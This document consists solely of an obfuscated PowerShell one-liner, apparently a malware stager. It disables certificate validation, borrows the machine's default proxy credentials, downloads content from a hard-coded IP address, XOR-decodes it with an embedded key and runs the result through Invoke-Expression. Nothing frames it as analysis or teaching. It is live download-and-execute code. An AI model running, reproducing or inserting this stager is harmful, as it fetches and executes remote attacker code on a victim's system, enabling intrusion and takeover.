
$wC=New-ObjEcT SYsTEM.NeT.WEBClIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADers.AdD('User-Agent',$u);$WC.ProXY = [SYsTem.NeT.WEBREQuEST]::DEFAuLtWebPRoxY;$Wc.Proxy.CREdenTialS = [SysTEM.NET.CredeNTIAlCache]::DEfaUlTNeTWOrkCRedENTials;$K='UO_?23+}DPC^cQzg@jlSH6!Iv*RMk.px';$i=0;[ChAr[]]$b=([CHAR[]]($wc.DownLoADStRinG("https://66.192.70.38:80/index.asp")))|%{$_-BXOr$k[$i++%$k.LEngTH]};IEX ($b-JOin'')

